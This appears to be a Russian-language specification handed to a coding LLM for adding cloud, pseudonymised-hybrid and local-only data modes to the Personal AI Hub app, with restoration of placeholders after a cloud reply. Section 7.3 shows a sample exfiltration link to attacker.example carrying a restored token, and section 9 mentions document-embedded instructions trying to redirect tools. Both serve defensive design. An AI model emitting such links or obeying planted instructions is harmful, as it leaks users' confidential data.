# Защищённые режимы Personal AI Hub: самодостаточное задание coding-LLM

## 1. Назначение и результат

Реализовать в существующем Personal AI Hub три режима обработки данных, переключатель в чате, локальную подготовку очищенного контекста для внешних LLM и **обратное восстановление конкретных названий и данных после ответа внешней модели**.

Работать в репозитории https://github.com/AleksMolch/Personal_AI_Hub. Перед реализацией читать AGENTS.md и фактический код. Этот документ описывает целевое поведение, а не подтверждённое состояние текущей ветки. Не считать старые ревью доказательством состояния HEAD.

Продукт сохраняет текущие Next.js/React UI, FastAPI, PostgreSQL, Celery/Valkey, Qdrant, DuckDB и abstractions Provider/Job/Asset. Не создавать новый продукт и не заменять UI на LibreChat. Существующие данные, диалоги и провайдеры должны пережить миграцию.

Все документы, пояснения нетривиальных блоков, сообщения UI и отчёты — на русском языке. В начале каждого нового исходного файла: назначение, функции, архитектурная роль. Примеры структур ниже являются проектными контрактами: адаптировать к существующим типам, не копировать без проверки.

## 2. Обязательные решения владельца

1. **Пользователь самостоятельно выбирает любой режим. Корпоративных административных ограничений, minimum_level, запрета по роли или списка одобренных работодателем провайдеров не вводить.**
2. Предупреждать об ограничениях, но не выдавать приложение за средство подтверждения соответствия корпоративным политикам.
3. Внутри выбранного режима правила выполняются строго. Если защищённый запрос невозможно подготовить, предложить локальную обработку, ручное редактирование либо явное переключение пользователем на облачный режим. Никогда не ослаблять режим автоматически.
4. Модель можно добавить и использовать без цены. Сохранять usage и метаданные, стоимость — unknown/null, а не ноль. Предупреждать о неполном денежном учёте и невозможности гарантировать денежный лимит таких запросов. Отсутствие цены не отключает защиту данных.
5. Оригиналы, OCR, локальные расчёты, карта псевдонимов и восстановление ответа остаются в локальном контуре.
6. «Защищённый гибрид» означает минимизацию и псевдонимизацию, а не гарантированную анонимность. Никаких обещаний «100% безопасно».
7. Публичность названия компании не означает публичность факта её участия в сделке. Защищать связи и содержание, а не только отдельные строки.
8. Локально означает на хосте приложения. Если приложение работает на удалённом сервере, данные покидают компьютер пользователя при загрузке; UI обязан говорить «на сервере приложения», а не «на вашем устройстве».

## 3. Режимы

### 3.1. cloud_controlled — «Облако с предупреждениями»

- Пользователь разрешает отправку выбранного контекста внешней модели.
- Локально проверять секреты, идентификаторы и внутренние данные. Показать обнаруженные категории и возможность перейти в гибрид, отредактировать запрос или осознанно продолжить.
- Не делать псевдонимизацию скрытно. Показывать фактически отправляемую версию.
- При явных секретах показать отдельное предупреждение с подтверждением именно текущего payload; не хранить общее вечное разрешение на отправку секретов. Не вводить корпоративный запрет поверх выбора пользователя.
- Файлы отправлять только при явном выборе поддерживаемого облачного сценария; прикрепление само по себе не должно запускать внешнюю загрузку.
- Метка результата: «Облако», фактический провайдер и переданные категории/объём. Не показывать зелёный щит локальности.

### 3.2. protected_hybrid — «Защищённый гибрид»

- Все исходные файлы, OCR, parsing, чувствительные расчёты и построение контекста — локально.
- Внешней модели передавать только локально подготовленные, проверенные минимальные текстовые фрагменты с псевдонимами.
- Прямые названия организаций/объектов, адреса, координаты, реквизиты, контакты, внутренние идентификаторы, домены, секреты удаляются/заменяются.
- Уникальные финансовые/технические/коммерческие сведения могут требовать исключения целого фрагмента: замена имён их не делает безопасными.
- Raw PDF/DOCX/XLSX, изображения, base64, подписи/печати, original filename, EXIF, скрытые листы, комментарии и карта соответствий никогда не отправляются.
- Embeddings и reranking исходных чувствительных данных — локально. Если локальная модель отсутствует, доступен lexical retrieval или явное сообщение об отсутствии функции. Нельзя сначала отправить документ в облачные embeddings, а затем объявить запрос защищённым.
- Веб-поиск выключен по умолчанию. Его включение пользователем означает дополнительный внешний канал; показывать отдельное предупреждение и preview очищенных поисковых строк. Поиск не получает весь диалог или исходный документ.
- При сбое/неопределённости детектора не передавать исходник. Предложить редактирование, local_only или смену режима.
- После ответа восстановить допустимые сущности локально по правилам раздела 7.

### 3.3. local_only — «Только локально»

- Не отправлять пользовательские данные и запросы внешним LLM, embeddings, OCR, web search, tool/MCP endpoints, аналитике или внешним генераторам.
- Локальные модели подключаются через Ollama, LM Studio, llama.cpp либо явно настроенный доверенный локальный endpoint. Проверять, что runtime использует локальную модель, а не облачный backend под локальным URL. URL сам по себе этого не доказывает.
- Поддержать host machine inference из Docker: `localhost` внутри контейнера — не хост. Документировать host.docker.internal и Linux host-gateway; не открывать inference в Интернет ради удобства.
- Если LLM отсутствует, оставить доступными локальные OCR, извлечение, таблицы, экспорт. Чат-генерация недоступна с объяснением; облачного fallback нет.
- SearXNG, работающий локально, всё равно делает внешние поисковые запросы: в этом режиме запрещён.
- Скачивание моделей/пакетов не происходит скрытно при обработке. Подготовка моделей — отдельное явное действие до использования защищённых данных.
- Предусмотреть отдельный изолированный профиль с ограничением исходящего трафика; не заявлять сетевую изоляцию до её проверки. Для полного офлайн-развёртывания локально раздавать шрифты, JS/CSS и assets, исключить CDN/analytics/update checks.
- «Локальная генерация» и «проверенная сетевая изоляция» — отдельные индикаторы. Обычный UI-переключатель не доказывает нулевой трафик всего компьютера.

По умолчанию предложить protected_hybrid на первом запуске с возможностью сразу выбрать другой режим. Если он не настроен, показать состояние «требуется настройка», не подменять облаком. Настройка по умолчанию и настройка текущего диалога сохраняются отдельно.

## 4. Предварительный аудит до изменений

Создать docs/security/PROTECTION_ASSESSMENT.md с commit SHA, датой, фактическими путями и исходными результатами тестов.

Проверить:
- места chat/embeddings/RAG synthesis/provider discovery/tool/web вызовов;
- существующую авторизацию, SSE, billing, cancel/retry;
- OCR и parser pipeline, обработку CSV/XLSX, upload limits;
- хранение истории, метаданных, ключей и assets;
- исходящие соединения worker и API, logs/telemetry;
- доступность локальных inference/embedding адаптеров;
- действительные зависимости и лицензии.

Отделять платные inference calls от бесплатного catalog/health API. Все внешние соединения проходят routing policy, но бесплатный GET /models не надо представлять как расход модели. Не повторять прежнее ошибочное утверждение, будто любые шесть API-точек — шесть платных LLM-вызовов.

Создать ADR о режимах, границах доверия и схеме восстановления. Предыдущие предположения о точности OCR/NER не считать фактами. Продолжать реализацию в рамках этого задания после аудита; отдельное разрешение на каждую обратимую правку не требуется.

## 5. Архитектура

### 5.1. Единая граница вызовов

Добавить/расширить AiInvocationService и отдельную EgressPolicy для HTTP/tools/provider discovery. Сервисы отвечают за:
- snapshot режима и ревизии контекста;
- проверку фактического маршрута и capabilities;
- подготовку очищенного контекста;
- binding preview к отправляемому payload;
- budget/usage для платных вызовов;
- нормализацию ошибок, отмену, аудит;
- запрет скрытого fallback на другой контур.

Не строить монолитную функцию на все случаи: выделить ContextBuilder, ProtectionAnalyzer, Sanitizer, EntityVault, OutboundGate, ResponseRestorer и Transport. API и worker используют одни правила. Оригиналы и восстановленная история не должны быть доступны облачному transport как случайный альтернативный аргумент.

### 5.2. Два представления контекста

Хранить логически разные представления:
1. Private context — оригиналы и восстановленные ответы для локального отображения/расчётов.
2. Sanitized context — очищенные user/assistant messages для внешней модели.

**Критический инвариант:** восстановленный ответ никогда напрямую не добавляется в следующий облачный prompt. Каждый новый исходящий контекст строится из очищенной истории или заново проходит полную очистку. Это касается summary, цитат, filename, system instruction, tool results и предыдущих ответов.

Private и sanitized версии имеют provenance и ревизии. После редактирования/ветвления/смены режима инвалидировать несовместимые preparations и summaries.

### 5.3. Модель данных (адаптировать к фактической схеме)

Conversation: default_protection_mode, protection_revision, privacy_scope_id.

ProtectionPreparation:
- id, user_id, conversation_id, branch_id, input_revision;
- mode, policy_version, detector_version, sanitizer_version;
- status: analyzing / review_required / ready / blocked / expired / consumed;
- encrypted sanitized payload, entity counts, transformations, unresolved risks;
- model/provider identity, tool/search options, content digest;
- created_at, expires_at, confirmed_at, generation_id, idempotency_key.

EntityScope / EntityMapping:
- scope_id, owner_id, opaque_entity_id, type;
- encrypted canonical value, encrypted observed aliases;
- local keyed lookup digest (не публичный hash исходного значения);
- restore_policy: normal / explicit_reveal / never;
- creation/version/expiry metadata.

MessageProtection:
- message_id, preparation_id, requested_mode, actual_route;
- encrypted private content, sanitized content/reference;
- restoration_state: complete / partial / unavailable / not_applicable;
- actual provider/model, approved entity IDs, coverage warnings.

ProtectionAudit: событие, время, request/job id, режим, счётчики, решение, версии, keyed payload digest. Без текста, секретов и полной карты.

Денежные значения Decimal/NUMERIC. Unknown cost должен быть nullable; проверить совместимость миграции со старой схемой и отчётами. Нулевые тарифы локальной модели задаются явно и означают отсутствие API-платы, а не нулевую стоимость электричества.

## 6. Алгоритм обработки запроса

### 6.1. Приём и фиксация режима

Сохранить mode snapshot для конкретной отправки. Изменение UI во время генерации относится к следующему запросу и не меняет уже выполняющийся. Для прекращения текущей отправки нужна отмена; уже переданные данные вернуть невозможно.

Проверить владельца диалога/assets, размер, формат и доступные локальные инструменты. Сформировать набор входов: текст, выбранная история, вложения, инструкции, retrieval context, tool outputs.

### 6.2. Локальное извлечение

PDF/DOCX/XLSX/images разбирать локально. Реализовать limits по bytes/pages/sheets/extracted text/time/image resolution и защиту от архивных бомб. Ошибка или неполный OCR — coverage warning, а не «данные безопасны».

Не отправлять файл наружу для помощи детектору. Соблюдать порядок чтения и page/sheet provenance. OCR и parser registries подключают фактические текущие backends; не устанавливать RapidOCR/Docling/MarkItDown без необходимости и оценки.

### 6.3. Детекция: несколько независимых источников

Объединить:
- правила и checksum для ИНН/ОГРН/СНИЛС/БИК/счетов там, где применимо;
- email, телефоны, IP/hostname, URL, координаты, номера договоров/заказов;
- secret scanning: credentials, JWT, keys, password-bearing connection strings;
- локальный пользовательский словарь организаций, объектов, проектов, продуктов, сотрудников и их вариантов;
- NER для PERSON/ORG/LOCATION; Presidio как опциональный оркестратор, с проверенными русскоязычными recognizers;
- необязательную локальную LLM для обнаружения коммерческого смысла и связей.

Никакая облачная модель не участвует в детекции исходника. Нельзя считать отсутствие находок доказательством отсутствия риска. Не использовать выдуманные «типичные 90%» или confidence как вероятность безопасности; пороги калибровать на собственных тестах и указывать coverage.

Нормализация Unicode/форматов применяется к анализу с отображением spans назад в исходный текст. Не менять текст разрушительно до сохранения координат. При перекрытиях разрешать конфликты по явным правилам (например, целый адрес вместо отдельных слов), сохранять возможность ручной правки.

### 6.4. Классификация и разделение задач

Для каждого фрагмента определить:
- можно ли его исключить без потери задачи;
- можно ли заменить идентификаторы;
- содержит ли он чувствительный смысл, который останется после замены;
- можно ли выполнить вычисление локально;
- можно ли передать внешней модели абстрактную постановку или синтетический пример.

Например: точные продажи и клиенты остаются в DuckDB; облако получает вопрос о структуре отчёта либо разрешённый агрегат. Агрегат малой группы/уникальная сумма тоже может раскрывать сведения — не считать автоматически безопасным.

Для generic свободного текста автоматическая оценка коммерческой тайны ограничена. Спорные фрагменты требуют review. Не скрывать замену, меняющую юридический/математический смысл.

### 6.5. Преобразования

Поддержать три разных типа, не смешивая их:
- REPLACE_REVERSIBLE: конкретное значение → opaque placeholder; можно восстановить.
- REMOVE: фрагмент исключён; не восстанавливать его автоматически в ответе.
- GENERALIZE: дата/сумма/место обобщены; не делать обратную подстановку как будто облако анализировало точное значение.

Для точных расчётов использовать локальный движок. Если облаку передан диапазон вместо суммы, его вывод относится к диапазону. UI показывает факт обобщения.

### 6.6. Токены и область соответствий

Пример placeholder: `[[PAH_ORG_a71c_009f]]`. Реальный ID генерируется криптографически случайно; не содержит оригинала, ИНН, адреса, hash без ключа или глобального порядкового номера.

- Один реальный объект получает стабильный ID внутри privacy_scope диалога.
- В разных диалогах используются разные scope, чтобы уменьшить связываемость.
- Алиасы, падежи, сокращения и варианты регистра связывать только после достаточно надёжного анализа/подтверждения. Не объединять «ООО Альфа» и «АО Альфа» автоматически по похожести.
- Зарезервированный синтаксис в пользовательском вводе экранировать/маркировать до генерации placeholders; не позволять пользователю/документу подделать системный токен.
- Реестр approved tokens фиксируется для конкретной отправки: наличие значения в общем vault не разрешает восстановить его в любом ответе.

### 6.7. Минимизация, проверка и preview

Построить минимальный outbound payload и просканировать повторно. Проверяется весь контекст, включая system messages, summaries, filenames, citations, tool arguments/results и поисковые запросы. Удалить raw file bytes/base64/URLs на оригиналы.

При unresolved findings вернуть review_required или blocked для текущего режима. Пользователь может исправить безопасную версию либо сменить режим; не ставить corporate запрет.

Preview показывает:
- точную текстовую версию отправляемых сообщений и выбранную историю;
- получателя/модель, web/tool channels;
- какие поля заменены/исключены/обобщены;
- непроверенные области и отсутствие гарантии анонимности;
- кнопки «Редактировать», «Отправить эту версию», «Только локально», «Сменить режим».

Редактирование preview требует повторной проверки. Если возвращены оригиналы, в hybrid отправку не выполнять: предложить снова очистить или явно перейти cloud_controlled.

### 6.8. Отправка и защита от гонок

Prepare не делает платного облачного запроса. Commit принимает preparation_id, confirmation/digest и idempotency key. Сервер проверяет владельца, срок, revision, mode, provider/model/tool config и digest фактического payload.

Изменение текста, истории, вложений, модели/получателя, режима или инструментов аннулирует подтверждение. Отправлять ровно подтверждённый payload. Обеспечить идемпотентное создание одной generation для повторного commit.

Только после успешной проверки выполнить billing reservation (если цена известна) и provider call. При неизвестной цене — разрешить по выбору пользователя с warning, сохранить usage без фиктивной нулевой стоимости.

Никакого повторного платного вызова из-за ошибки восстановления. Retry по ошибкам transport не должен обходить protection gate или переключать контур.

## 7. Обратная замена после ответа внешней LLM — обязательная функция

### 7.1. Общий принцип

Cloud response хранится/обрабатывается сначала в очищенной форме. Локальный ResponseRestorer получает:
- authenticated user/conversation/scope;
- generation/preparation id;
- **только токены, разрешённые для этой отправки**;
- ответ с placeholders;
- restore policy сущностей.

Карта никогда не передаётся модели, proxy, telemetry, search или браузеру целиком. В браузер возвращается только разрешённый восстановленный текст и статусы.

Инструкцию внешней модели дополнять: сохранять placeholders точно, не склонять/переводить/дополнять их, не изобретать соответствия. Это улучшает качество, но не служит контролем безопасности.

### 7.2. Алгоритм восстановления

1. Проверить owner/scope/generation и доступность ключа.
2. Разобрать точные placeholder tokens.
3. Проверить membership в allowlist текущего запроса.
4. Получить mapping только для разрешённых токенов.
5. Заменить в текстовых узлах один раз, без рекурсивного replacement.
6. Неизвестный, изменённый или запрещённый токен оставить обозначением и показать warning; не угадывать по fuzzy matching.
7. Не раскрывать секреты автоматически: key/password/token mappings имеют explicit_reveal или never; при explicit_reveal пользователь открывает значение отдельным локальным действием. Названия организаций, адреса и другие обычные сущности можно восстанавливать автоматически в локальном отображении.
8. Сохранить restoration_state и очищенный ответ отдельно от private представления.
9. Не выдавать восстановление за проверку смысла: модель может перепутать роли COMPANY_1/COMPANY_2, хотя подстановка технически верна. Для существенных выводов дать открыть исходные цитаты.

Две организации не должны обменяться значениями из-за порядка replacements. Использовать parser/точное сопоставление, а не цепочку `str.replace` со случайным порядком.

### 7.3. Безопасность Markdown/JSON/кода

Восстановленные строки считаются недоверенными данными, а не HTML/Markdown-инструкциями. Заменять текстовые AST-узлы безопасно; raw HTML отключён либо санитизирован по проверенной allowlist.

**Не восстанавливать автоматически внутри URL, href/src, Markdown destination, HTML attributes, image tags или tool commands.** Иначе модель может сформировать `https://attacker.example/?secret=[[TOKEN]]`, а приложение подставит значение и утечка случится при открытии ссылки.

Запретить auto-load удалённых картинок/favicon/previews для защищённых сообщений. Для JSON восстановление делать после parse по разрешённым string fields с повторной schema validation; не вставлять строки в сырой JSON. Для кода — только отображение plain text; не исполнять сформированный код/команды автоматически.

### 7.4. Streaming

Рекомендуемый первый релиз: стримить очищенный текст; по завершении восстановить текст атомарно и показать отметку «Названия восстановлены локально». Пользователь может видеть очищенную версию по переключателю.

Если реализуется инкрементальное восстановление: буферизовать незавершённый placeholder между chunks, ограничивать buffer length/time, заменять только полные проверенные токены. Тестировать разрыв по каждому символу. Не мигать оригиналами до проверки.

### 7.5. Утрата карты, перезапуск и retention

Карта шифруется AEAD либо существующим authenticated encryption; мастер-ключ отдельно от БД. Ассоциировать запись с owner/scope/version; не создавать собственную криптографию.

Карта должна переживать restart приложения. Срок хранения настраивается пользователем и понятен в UI. Не удалять карту сразу после ответа, если обещано дальнейшее восстановление истории; очистка предупреждает о последствиях.

При истечении/удалении/потере ключа: ответ остаётся в очищенной форме, restoration_state=unavailable, без угадывания. Сохранённые ранее private копии тоже являются чувствительными данными: объяснить, что удаление vault не удаляет их автоматически. Предусмотреть явное «Удалить карту и восстановленные копии».

Backup: vault и private content содержат секреты. Задокументировать шифрование backup и отдельное восстановление ключа. Не помещать master key в незашифрованный backup.

### 7.6. Пример

Исходник: «ООО Север заключило договор с ООО Юг по объекту на ул. Примерной, 12».

Облако получает: «[[PAH_ORG_a71c_009f]] заключило договор с [[PAH_ORG_a71c_071b]] по объекту [[PAH_SITE_a71c_032d]]».

Облако отвечает: «Уточните ответственность [[PAH_ORG_a71c_009f]] перед [[PAH_ORG_a71c_071b]]».

Пользователь локально видит: «Уточните ответственность ООО Север перед ООО Юг».

Следующий cloud request получает снова псевдонимы, **не эту восстановленную строку**.

## 8. История, смена режима и повторное раскрытие

- Смена режима не отменяет уже совершённую передачу данных.
- local_only → hybrid: пересобрать и очистить всю выбранную историю, включая локальные ответы и summaries, затем preview.
- hybrid → cloud: явное предупреждение «Разрешаете отправку оригинальных данных?». Режим сам по себе не означает автоматический экспорт всей private history. По умолчанию сохранить очищенную историю; включение оригиналов — отдельное действие с preview.
- cloud → hybrid/local: показать, что прошлые сообщения уже могли попасть внешнему провайдеру; следующие запросы обрабатываются новым способом.
- Изменение default не переписывает старые policy snapshots.
- Ветвление наследует сущности с явным scope handling; авторизация никогда не определяется угадываемым placeholder.
- Summary/retrieval cache разделять по owner/scope/mode/version. Нельзя использовать cloud summary в качестве очищенного контекста без проверки.

## 9. RAG, файлы, web и инструменты

- Hybrid/local indexing оригиналов выполняется локальными embeddings. Миграция существующей облачной KB: новый локальный индекс; не смешивать пространства. Ранее отправленные embeddings-данные не становятся «никогда не покидавшими устройство».
- Внешняя модель видит очищенные цитаты. Локальный citation resolver открывает исходную страницу/лист по внутреннему ID.
- Облачный tool call может работать только с разрешённой очищенной областью данных. Документные инструкции не могут менять режим/allowlist/recipient.
- Web queries тоже проходят prepare/gate. Не подставлять восстановленные значения в поисковую строку. В local_only web отсутствует.
- Генерация DOCX/XLSX/PDF из очищенной структуры и восстановление значений выполняются локально. Экспорт «для передачи» по умолчанию очищенный; «с оригинальными данными» — явный вариант, без автоотправки в email/cloud storage.
- Generic task retry/cancel сохраняет snapshot. Ошибка OCR/LLM не разрешает внешний fallback.
- Видео сейчас не реализовывать. Зарезервировать policy для будущих media attachments: сырой референс нельзя считать очищенным после обработки только текста prompt.

## 10. API-контракты

Использовать /api/v1 и существующую auth/error схему. Имена уточнить после аудита, избегая дублирования endpoints.

- GET /protection/capabilities — доступные режимы и prerequisites; состояние локальных OCR/embeddings/LLM, версия политики. Не утверждать изоляцию без проверки.
- PATCH /users/me/preferences — пользовательский default mode и настройки preview/retention.
- PATCH /conversations/{id}/protection — режим будущих запросов, увеличение revision.
- POST /conversations/{id}/preparations — вход, attachments, mode, model, options; возвращает preparation id/job id. Для долгого OCR использовать Job, не блокирующий HTTP.
- GET /preparations/{id} — статус, sanitized preview, warnings, transformations и readiness.
- PATCH /preparations/{id} — ручные corrections с повторной проверкой и новым digest.
- POST /preparations/{id}/commit — digest, confirmation, idempotency key; возвращает generation id.
- GET /messages/{id}?view=private|sanitized — авторизованное получение представления.
- POST /messages/{id}/restore — локальное восстановление; никогда повторный LLM call.
- DELETE /conversations/{id}/entity-map — очистка с последствиями/confirmation.

GET не должен запускать платный вызов. Preview endpoints требуют auth, Cache-Control: no-store, запрет cross-user доступа. Не класть JWT/оригиналы в query string.

Коды ошибок: PROTECTION_NOT_READY, REVIEW_REQUIRED, LOCAL_RUNTIME_UNAVAILABLE, LOCAL_EMBEDDINGS_UNAVAILABLE, OUTBOUND_POLICY_DENIED, PREPARATION_STALE, PAYLOAD_CHANGED, PREPARATION_EXPIRED, ENTITY_MAP_UNAVAILABLE, RESTORATION_PARTIAL. Отсутствие цены — warning, а не защита/HTTP error.

SSE: protection.analyzing, protection.review_required, generation.started/content.delta/completed, restoration.completed/partial. Финальное completed выдавать после commit результата, а не до сохранения. Не допустить race, когда UI обновляет историю до записи восстановленного ответа.

## 11. UI: переключатель и приятный рабочий сценарий

### 11.1. В композере чата

Постоянно видимая кнопка «Обработка данных: …» открывает три radio options:
- Облако с предупреждениями — «Вы выбираете, что передать внешней модели».
- Защищённый гибрид — «Оригиналы локально, в облако — проверенный контекст с заменами».
- Только локально — «Внешние AI и поиск отключены».

Кнопка доступна с клавиатуры и на мобильном; текст+иконка, цвет не единственный индикатор. Никаких корпоративных lock icons/ролей. Сохранять выбранный режим диалога на сервере.

Capabilities селектора моделей меняются по режиму. Если текущая модель облачная, при local_only предложить локальную; если её нет — предложить настройку, не возвращать silently cloud. Профиль модели «без цены» доступен во всех допустимых маршрутах.

### 11.2. Панель подготовки

Состояния: извлечение → анализ → подготовка → нужно решение → готово → отправка → ответ → восстановление.

Показывать реальные события, не выдумывать процент точности/защищённости. Текст: «Обнаружено и заменено 8 упоминаний. Нераспознанные данные возможны». Не писать «очищено 100%».

Preview drawer: исходник/очищенная версия (оригинал открывается только локально), список замен и исключений, остаточные предупреждения, реальный получатель, история и web/tools. Подтверждение привязано к версии. Можно закрыть и вернуться, ничего не отправив.

### 11.3. Сообщение после ответа

- Badge фактического маршрута, а не просто выбранного режима.
- «Названия восстановлены локально» / «Восстановлено частично».
- Переключатель «Оригинальные данные / Псевдонимы».
- Отдельные действия copy/export для отображаемой версии; предупреждение при экспорте оригиналов.
- «Что было передано» открывает конкретный sanitized payload, если он сохранён по retention policy.
- Стоимость known/estimated/unknown и предупреждение о неполном бюджете.

### 11.4. Настройки

Режим по умолчанию; local runtime setup; проверка доступности; пользовательский словарь; ручная корректировка связей сущностей; TTL; очистка private data; политика preview; понятная диагностика.

Не использовать email/поля профиля, которых нет в схеме. Не добавлять большую auth/API-token систему как побочную задачу.

### 11.5. Безопасность самого UI

Raw HTML модели выключить; ссылки проверять; внешние изображения/favicons не загружать автоматически. Локальные шрифты. Sensitive preview не сохранять в localStorage. Не показывать секреты в error toast. А11y: focus management, aria labels, отдельный polite status для завершения, без чтения каждого streaming token; IME Enter не отправляет до завершения composition.

## 12. Инструменты и зависимости

Использовать существующие реализации, добавляя только отсутствующее:
- локальный OCR: текущий Tesseract либо проверенный adapter;
- локальные embeddings/LLM: Ollama/LM Studio/совместимый runtime; CPU режим допустим, не требовать GPU для всех моделей;
- Presidio/NER/словарь/regex — после проверки русского языка, лицензий кода и весов;
- existing encrypted credential infrastructure — расширить для EntityVault с разделением ключей/назначений по необходимости;
- react-markdown с безопасными настройками; shadcn/Radix по текущей дизайн-системе.

Не считать LiteLLM средством локальности или DLP: его fallback/caching/logging тоже нуждаются в policy. Если не используется сейчас, не делать обязательным для этой функции.

Все модели и артефакты устанавливаются явно. Зафиксировать версии, источники, checksum и лицензии. Не скачивать неизвестные модели в рабочем запросе. Не делать заявлений о cloud retention/training без проверки конкретного договора/API.

## 13. Проверки и критерии приёмки

### 13.1. Базовые regression

Зафиксировать исходное состояние. После каждого вертикального среза — релевантные unit/integration, lint/types, запуск и smoke. Перед итоговым релизом — полная бесплатная suite и Playwright. Использовать реальные команды репозитория; не выдумывать существование make test-live.

### 13.2. Обязательные unit тесты

- spans Unicode, нормализация, пересечения и алиасы;
- неодинаковые юрлица с похожими названиями;
- stable mapping в scope и различие между scopes;
- точная обратная замена, порядок, повторения, неизвестный placeholder;
- token injection и отсутствие recursive replacement;
- GENERALIZE/REMOVE не превращаются обратно в точные данные;
- restore_policy секретов;
- broken streaming tokens по границам;
- missing/expired map и неверный ключ;
- mode transitions и revision invalidation;
- null cost не равен zero.

### 13.3. Интеграционные тесты с mock provider и перехватом payload

Синтетический документ с ООО, адресами, реквизитами, ФИО, именем файла и секретами:
1. В hybrid провайдер не получает ни одной контрольной исходной строки/байтов вложения.
2. Ответ с placeholders восстанавливает ожидаемые организации/адреса в локальном UI.
3. Следующий turn не отправляет восстановленные строки повторно.
4. Облачный summary и RAG не обходят очистку; embeddings оригиналов не уходят наружу.
5. URL c placeholder не раскрывает mapping и не вызывает внешний fetch.
6. Чужой token/scope/user не открывает значение.
7. Сбой детектора/OCR запрещает незаметную отправку исходника.
8. Commit с изменённым digest/revision/provider отклоняется до сети.
9. Повторный commit не создаёт второй платный запрос.
10. Cancel/restart не теряет карту и корректно завершает статусы.
11. Local_only не делает внешних HTTP/DNS inference/search/tool вызовов в тестируемом контуре; отдельно проверить инфраструктурный egress.
12. Неверно помеченный local proxy не считается достаточным доказательством локальности: configuration attestation/проверка конкретного runtime описана.
13. Модель без цены работает; usage остаётся, cost unknown, warning видим.

### 13.4. E2E

Переключение трёх режимов без роли администратора; доступный composer; preview и ручная правка; подготовка с Job; restored/sanitized view; безопасная копия/экспорт; local runtime unavailable; отсутствие цены; responsive light/dark; keyboard/axe; invalidated preview после изменения контекста.

### 13.5. Качество распознавания

Подготовить размеченный RU/EN dataset синтетических рабочих документов: компании, адреса, координаты, склонения, сокращения, реквизиты, OCR errors, скрытые листы/metadata, уникальные суммы и публичные названия в секретной связи.

Публиковать precision/recall по категориям и пропуски на этом наборе, не как универсальную гарантию. Считать отдельно риск ложного объединения организаций и потерю смысла. Не считать ручное review заменой всех технических контролей.

### 13.6. Финальная приёмка

- Режим выбирает пользователь, корпоративных ограничений нет.
- Нет скрытого ослабления выбранной политики.
- Hybrid разделяет private/sanitized историю.
- Обратная замена работает локально, переживает restart и не повторяет платный вызов.
- Vault недоступен transport и чужому пользователю.
- Подстановка не создаёт утечку через ссылки/картинки/tools.
- Local-only работает после предварительной установки моделей без облачного fallback.
- Ограничения честно отображены, unknown не выдаётся за safe/free.
- Старые диалоги и миграции проверены.
